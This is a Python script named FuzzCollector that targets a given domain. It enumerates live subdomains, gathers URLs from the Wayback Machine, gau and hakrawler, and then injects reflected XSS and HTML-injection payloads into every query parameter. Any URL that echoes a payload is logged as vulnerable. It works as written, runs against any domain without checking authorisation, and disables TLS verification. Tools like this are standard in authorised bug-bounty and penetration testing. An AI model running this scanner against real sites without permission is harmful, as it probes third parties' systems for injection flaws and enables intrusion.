#!/usr/bin/env python3
import os
import sys
import signal
import subprocess
import requests
import urllib3
import tldextract
from time import sleep
from urllib.parse import urlparse, parse_qs, urlencode
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich import box
from rich.table import Table

# ========== Setup ==========
console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
HEADERS = {"User-Agent": "Mozilla/5.0"}
PAYLOADS = {
    "XSS": "<script>alert(1337)</script>",
    "HTML": '</a><a href="https://bing.com">Click</a>'

}

SUB_WORDLIST = "subs.txt"
OUTPUT_DIR = "output"
LIVE_FILE = f"{OUTPUT_DIR}/livesubdomains.txt"
ENDPOINTS_FILE = f"{OUTPUT_DIR}/endpoints.txt"
VULN_FILE = f"{OUTPUT_DIR}/xss_vulns.txt"

stop_flag = False
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ========== Handle Ctrl+C ==========
def sigint_handler(sig, frame):
    global stop_flag
    stop_flag = True
    console.print("\n[bold red]✘ User aborted with Ctrl+C — Cleaning up and exiting...[/bold red]")
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

# ========== UI Banner ==========
def banner(domain):
    panel = Panel.fit(f"[bold red]FuzzCollector v2.0 🚀[/bold red]\n[magenta]Target:[/magenta] [bold]{domain}[/bold]", title="🔎", border_style="red", box=box.DOUBLE)
    console.print(panel)

# ========== Subdomain Fuzzing ==========
def find_subdomains(domain):
    console.print(f"\n[bold cyan][*] Fuzzing subdomains for:[/bold cyan] [bold blue]{domain}[/bold blue]")
    if not os.path.exists(SUB_WORDLIST):
        console.print(f"[red]✘ Missing subdomain wordlist: {SUB_WORDLIST}[/red]")
        sys.exit(1)

    found = []
    with open(SUB_WORDLIST) as f:
        subnames = f.read().splitlines()

    with Progress() as progress:
        task = progress.add_task("[green]🔍 Checking subdomains...", total=len(subnames))
        for sub in subnames:
            if stop_flag: break
            full = f"http://{sub.strip()}.{domain}"
            try:
                r = requests.get(full, timeout=3, verify=False)
                if r.status_code < 400:
                    found.append(full.replace("http://", ""))
                    console.print(f"[green][+] Alive:[/green] {full}")
            except:
                pass
            progress.update(task, advance=1)

    with open(LIVE_FILE, "w") as f:
        f.write("\n".join(found))
    console.print(f"[green]✔ Saved live subs to[/green] [yellow]{LIVE_FILE}[/yellow]")

    return found

# ========== Endpoint Collection ==========
def collect_endpoints(subs):
    console.print(f"\n[bold yellow][+] Fetching endpoints from all live subdomains ...[/bold yellow]")
    total_urls = []

    for sub in subs:
        urls = set()
        host = f"https://{sub}"
        try:
            wayback = requests.get(f"https://web.archive.org/cdx/search/cdx?url=*.{sub}/*&output=text&fl=original&collapse=urlkey", timeout=10)
            urls.update(wayback.text.splitlines())
        except: pass

        try:
            gau = subprocess.run(["gau", sub], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            urls.update(gau.stdout.splitlines())
        except: pass

        try:
            hak = subprocess.run(["hakrawler", "-u", host], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            urls.update(hak.stdout.splitlines())
        except: pass

        if urls:
            console.print(f"[blue]✔[/blue] {host}: [green]{len(urls)} URLs found[/green]")
            total_urls.extend(list(urls))
        else:
            console.print(f"[red]✘[/red] {host}: [red]No URLs found[/red]")

    with open(ENDPOINTS_FILE, "w") as f:
        f.write("\n".join(total_urls))
    console.print(f"[cyan]✔ Total endpoints:[/cyan] {len(total_urls)} saved to [yellow]{ENDPOINTS_FILE}[/yellow]")

    return total_urls

# ========== Filter Parameterized ==========
def extract_param_urls(endpoints):
    valid = [u for u in endpoints if "?" in u and "=" in u]
    console.print(f"[green]✔ Valid URLs:[/green] {len(valid)}")
    return valid

# ========== XSS/HTMLi Scan ==========
def scan_payloads(urls):
    console.print(f"\n[bold blue][*] Scanning for reflected XSS and HTMLi ...[/bold blue]")
    vulns = []

    with Progress() as progress:
        task = progress.add_task("[bold red]💉 Testing payloads...", total=len(urls))
        for url in urls:
            if stop_flag: break
            try:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                for param in qs:
                    for label, payload in PAYLOADS.items():
                        mod = qs.copy()
                        mod[param] = payload
                        encoded = urlencode(mod, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded}"
                        r = requests.get(test_url, timeout=5, headers=HEADERS, verify=False)
                        if payload in r.text:
                            tag = "[bold red]XSS[/bold red]" if label == "XSS" else "[bold yellow]HTML[/bold yellow]"
                            console.print(f"[bold magenta][{tag}] found:[/bold magenta] [cyan]{test_url}[/cyan]")
                            vulns.append(f"[{label}] {test_url}")
            except: pass
            progress.update(task, advance=1)

    with open(VULN_FILE, "w") as f:
        for v in vulns:
            f.write(v + "\n")
    console.print(f"\n[green]✔ Scan complete. Results saved in {VULN_FILE}[/green]")

# ========== Main ==========
def main():
    if len(sys.argv) != 2:
        console.print("[red]Usage:[/red] python3 redhet.py <domain>")
        sys.exit(1)

    domain = sys.argv[1].strip()
    banner(domain)

    subs = find_subdomains(domain)
    if not subs:
        console.print("[red]✘ No live subdomains found[/red]")
        sys.exit(1)

    endpoints = collect_endpoints(subs)
    param_urls = extract_param_urls(endpoints)
    if not param_urls:
        console.print("[red]✘ No parameterized endpoints to scan[/red]")
        return

    scan_payloads(param_urls)

if __name__ == "__main__":
    main()
